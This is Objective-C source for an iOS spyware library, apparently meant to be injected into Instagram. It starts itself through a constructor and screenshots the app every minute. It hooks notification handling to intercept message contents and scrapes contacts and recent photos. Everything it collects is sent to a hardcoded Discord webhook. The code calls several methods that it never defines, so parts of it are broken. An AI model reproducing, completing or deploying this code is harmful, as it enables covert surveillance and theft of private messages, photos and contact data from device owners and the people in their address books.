#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <UserNotifications/UserNotifications.h>

@interface InstagramSpyware : NSObject
+ (instancetype)sharedInstance;
- (void)startAll;
- (void)takeScreenshot;
- (void)setDiscordWebhookURL:(NSString *)webhookURL;
- (void)scrapeContacts;
- (void)scrapePhotos;
@end

@implementation InstagramSpyware {
    NSTimer *_screenshotTimer;
    NSString *_discordWebhookURL;
    NSURLSession *_urlSession;
}
- (void)scrapeContacts {
    // Ensure the Contacts framework is available and we have permission
    if (![CNContactStore class]) return;
    CNContactStore *store = [[CNContactStore alloc] init];
    if ([store authorizationStatusForEntityType:CNEntityTypeContacts] != CNAuthorizationStatusAuthorized) {
        NSLog(@"Contacts not authorized.");
        return;
    }

    NSError *error;
    NSArray<CNContact *> *contacts = [store unifiedContactsMatchingPredicate:[CNContact predicateForContactsInContainerWithIdentifier:store.defaultContainerIdentifier] keysToFetch:@[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey] error:&error];

    if (error) {
        NSLog(@"Error fetching contacts: %@", error.localizedDescription);
        return;
    }

    if (contacts.count == 0) {
        NSLog(@"No contacts found.");
        return;
    }

    NSMutableString *contactList = [[NSMutableString alloc] init];
    for (CNContact *contact in contacts) {
        [contactList appendFormat:@"%@ %@\n", contact.givenName, contact.familyName];
        for (CNLabeledValue *label in contact.phoneNumbers) {
            NSString *phoneNumber = [CNPhoneNumber phoneNumberWithStringValue:label.value].stringValue;
            [contactList appendFormat:@"  - %@\n", phoneNumber];
        }
    }

    // Discord has a 2000 character limit for message content
    NSString *content = [NSString stringWithFormat:@"📇 Contact List Scraped (%lu contacts)\n```%@\n```", (unsigned long)contacts.count, contactList];
    if (content.length > 1900) {
        content = [NSString stringWithFormat:@"📇 Contact List Scraped (%lu contacts)\n```(List too long to display)```", (unsigned long)contacts.count];
    }

    NSDictionary *payload = @{@"content": content, @"username": @"Instagram Spy", @"avatar_url": @"https://i.imgur.com/mDKlggm.png"};
    [self sendToDiscordWebhook:payload];
}

- (void)scrapePhotos {
    // Check for permission
    if ([PHPhotoLibrary authorizationStatus] != PHAuthorizationStatusAuthorized) {
        NSLog(@"Photos not authorized.");
        return;
    }

    PHImageManager *manager = [PHImageManager defaultManager];
    PHFetchOptions *options = [[PHFetchOptions alloc] init];
    options.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
    options.fetchLimit = 3; // Send the 3 most recent photos to avoid spamming

    PHFetchResult<PHAsset *> *assets = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:options];

    if (assets.count == 0) {
        NSLog(@"No photos found.");
        return;
    }

    NSLog(@"Found %lu photos to scrape.", (unsigned long)assets.count);

    PHImageRequestOptions *imageOptions = [[PHImageRequestOptions alloc] init];
    imageOptions.synchronous = YES;
    imageOptions.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;

    for (PHAsset *asset in assets) {
        [manager requestImageForAsset:asset
                           targetSize:CGSizeMake(800, 800) // Request a reasonably sized image
                          contentMode:PHImageContentModeAspectFit
                              options:imageOptions
                        resultHandler:^(UIImage * _Nullable image, NSDictionary * _Nullable info) {
            if (image) {
                NSLog(@"Sending photo with local identifier: %@", asset.localIdentifier);
                [self sendScreenshotToDiscord:image]; // Reuse the existing image sending method
            }
        }];
    }
}
+ (instancetype)sharedInstance {
    static InstagramSpyware *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[InstagramSpyware alloc] init];
    });
    return instance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
        config.timeoutIntervalForRequest = 30.0;
        config.timeoutIntervalForResource = 60.0;
        _urlSession = [NSURLSession sessionWithConfiguration:config];
        _discordWebhookURL = @"https://discordapp.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";
    }
    return self;
}

- (void)setDiscordWebhookURL:(NSString *)webhookURL {
    _discordWebhookURL = webhookURL;
}

- (void)sendToDiscordWebhook:(NSDictionary *)payload {
    if (!_discordWebhookURL) {
        return;
    }
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:&error];
    if (error) {
        return;
    }
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_discordWebhookURL]];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:jsonData];
    
    NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            return;
        }
        
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (httpResponse.statusCode < 200 || httpResponse.statusCode >= 300) {
            NSLog(@"Discord webhook failed with status %ld", (long)httpResponse.statusCode);
        }
    }];
    
    [task resume];
}

- (void)sendScreenshotToDiscord:(UIImage *)screenshot {
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_discordWebhookURL]];
    [request setHTTPMethod:@"POST"];
    
    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    
    NSMutableData *body = [NSMutableData data];
    
    NSDictionary *payload = @{
        @"content": @"📸 New Instagram screenshot captured",
        @"username": @"Instagram Spy",
        @"avatar_url": @"https://i.imgur.com/mDKlggm.png"
    };
    
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:jsonData];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    
    NSData *imageData = UIImagePNGRepresentation(screenshot);
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"file1\"; filename=\"screenshot.png\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: image/png\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:imageData];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    
    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    
    [request setHTTPBody:body];
    
    NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            return;
        }
        
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (httpResponse.statusCode < 200 || httpResponse.statusCode >= 300) {
            NSLog(@"Screenshot upload to Discord failed with status %ld", (long)httpResponse.statusCode);
        }
    }];
    
    [task resume];
}

- (void)takeScreenshot {
    UIWindow *keyWindow = nil;
    
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *windowScene in [UIApplication sharedApplication].connectedScenes) {
            if (windowScene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *window in windowScene.windows) {
                    if (window.isKeyWindow) {
                        keyWindow = window;
                        break;
                    }
                }
                if (keyWindow) break;
            }
        }
 // ... inside the takeScreenshot method
    } else {
        // This block is for iOS versions prior to 13.0.
        // The @available check silences the deprecation warning.
        if (@available(iOS 13.0, *)) {
            // This should not be reached, but as a safeguard, we do nothing.
            // The main loop above should have found the window.
            keyWindow = nil;
        } else {
            keyWindow = [UIApplication sharedApplication].keyWindow;
        }
    }
    
    if (!keyWindow) {
        if (@available(iOS 15.0, *)) {
            for (UIWindowScene *windowScene in [UIApplication sharedApplication].connectedScenes) {
                if (windowScene.activationState == UISceneActivationStateForegroundActive) {
                    keyWindow = windowScene.windows.firstObject;
                    break;
                }
            }
        } else {
            NSArray *windows = [UIApplication sharedApplication].windows;
            keyWindow = windows.firstObject;
        }
    }
    
    if (!keyWindow) {
        return;
    }
    
    UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, NO, [UIScreen mainScreen].scale);
    [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES];
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    
    if (image) {
        NSData *imageData = UIImagePNGRepresentation(image);
        NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        [formatter setDateFormat:@"yyyy-MM-dd_HH-mm-ss"];
        NSString *timestamp = [formatter stringFromDate:[NSDate date]];
        NSString *fileName = [NSString stringWithFormat:@"ig_screenshot_%@.png", timestamp];
        NSString *filePath = [documentsPath stringByAppendingPathComponent:fileName];
        
        NSError *error;
        BOOL success = [imageData writeToFile:filePath options:NSDataWritingAtomic error:&error];
        if (success) {
            [self sendScreenshotToDiscord:image];
        }
    }
}

static void (*original_didReceiveNotification)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)) = NULL;

// This is now an Objective-C method, not a C function.
// It's added to the delegate class at runtime.
- (void)swizzled_didReceiveNotification:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler {
    // Get the original implementation (the one we are about to replace)
    SEL originalSelector = @selector(swizzled_didReceiveNotification:didReceiveNotificationResponse:withCompletionHandler:);
    SEL swizzledSelector = @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:);

    Class delegateClass = [self class];
    Method originalMethod = class_getInstanceMethod(delegateClass, originalSelector);
    IMP originalImplementation = method_getImplementation(originalMethod);

    // --- Your spyware logic ---
    UNNotificationContent *content = response.notification.request.content;
    InstagramSpyware *spyware = [InstagramSpyware sharedInstance];
    NSDictionary *notificationPayload = @{
        @"content": [NSString stringWithFormat:@"🔔 Intercepted Instagram Notification\n**Title:** %@\n**Body:** %@", content.title, content.body],
        @"username": @"Instagram Spy",
        @"avatar_url": @"https://i.imgur.com/mDKlggm.png",
        @"embeds": @[@{
            @"title": @"Notification Details",
            @"color": @5814783,
            @"fields": @[
                @{ @"name": @"Title", @"value": content.title ?: @"No Title", @"inline": @NO },
                @{ @"name": @"Body", @"value": content.body ?: @"No Body", @"inline": @NO },
                @{ @"name": @"Timestamp", @"value": [NSDateFormatter localizedStringFromDate:[NSDate date] dateStyle:NSDateFormatterShortStyle timeStyle:NSDateFormatterShortStyle], @"inline": @NO }
            ],
            @"footer": @{ @"text": @"Instagram Spy" }
        }]
    };
    [spyware sendToDiscordWebhook:notificationPayload];
    // --- End of spyware logic ---


    // Call the original implementation if it exists.
    // We use a function pointer cast to call the original IMP directly.
    // This is the correct way to invoke the original method from within a swizzle.
    if (originalImplementation) {
        void (*originalFunc)(id, SEL, UNUserNotificationCenter *, UNNotificationResponse *, void (^)(void)) = (void *)originalImplementation;
        originalFunc(self, swizzledSelector, center, response, completionHandler);
    } else if (completionHandler) {
        // If there was no original method to call, we must call the completion handler ourselves.
        completionHandler();
    }
}

- (void)hookNotifications {
    // Use a timer to periodically check for and hook the delegate.
    // This is more reliable than a single delayed call.
    [NSTimer scheduledTimerWithTimeInterval:5.0 repeats:YES block:^(NSTimer * _Nonnull timer) {
        UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
        id delegate = center.delegate;
        Class delegateClass = [delegate class];

        if (!delegateClass) {
            NSLog(@"[InstagramSpyware] Notification delegate not yet available, will retry...");
            return; // Retry in 5 seconds
        }

        // Get the method we want to swizzle
        SEL originalSelector = @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:);
        Method originalMethod = class_getInstanceMethod(delegateClass, originalSelector);

        if (!originalMethod) {
            NSLog(@"[InstagramSpyware] Could not find the notification delegate method to hook.");
            return;
        }

        // Get the method that contains our spyware logic
        SEL swizzledSelector = @selector(swizzled_didReceiveNotification:didReceiveNotificationResponse:withCompletionHandler:);
        Method swizzledMethod = class_getInstanceMethod([self class], swizzledSelector);

        if (!swizzledMethod) {
             NSLog(@"[InstagramSpyware] Could not find our own swizzled method implementation.");
             return;
        }

        // Check if we have already swizzled this class to avoid doing it multiple times.
        // We do this by checking if our swizzled method already exists on the target class.
        if (class_getInstanceMethod(delegateClass, swizzledSelector)) {
            NSLog(@"[InstagramSpyware] Notification delegate already hooked.");
            [timer invalidate]; // Stop the timer once successful
            return;
        }

        // Add our swizzled method to the delegate class
        BOOL didAddMethod = class_addMethod(delegateClass,
                                           swizzledSelector,
                                           method_getImplementation(swizzledMethod),
                                           method_getTypeEncoding(swizzledMethod));

        if (didAddMethod) {
            // If we successfully added our method, now swap the implementations.
            Method newMethod = class_getInstanceMethod(delegateClass, swizzledSelector);
            method_exchangeImplementations(originalMethod, newMethod);
            NSLog(@"[InstagramSpyware] Successfully hooked notification delegate.");
            [timer invalidate]; // Stop the timer once successful
        } else {
            NSLog(@"[InstagramSpyware] Failed to add swizzled method to delegate class.");
        }
    }];
}

- (void)startAll {
    // Start existing tasks
    _screenshotTimer = [NSTimer scheduledTimerWithTimeInterval:60.0 target:self selector:@selector(takeScreenshot) userInfo:nil repeats:YES];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self hookNotifications];
        [self hookTextEntry];
    });
    [self startClipboardMonitoring];

    // Scrape data once after a short delay
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self scrapeContacts];
        [self scrapePhotos];
        [self sendLocationIfAvailable];
    });
}

- (void)dealloc {
    [_screenshotTimer invalidate];
    // The [super dealloc] call is removed because ARC handles it.
}

@end

__attribute__((constructor))
void initInstagramSpyware() {
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification *note) {
        [[InstagramSpyware sharedInstance] startAll];
    }];
}
   
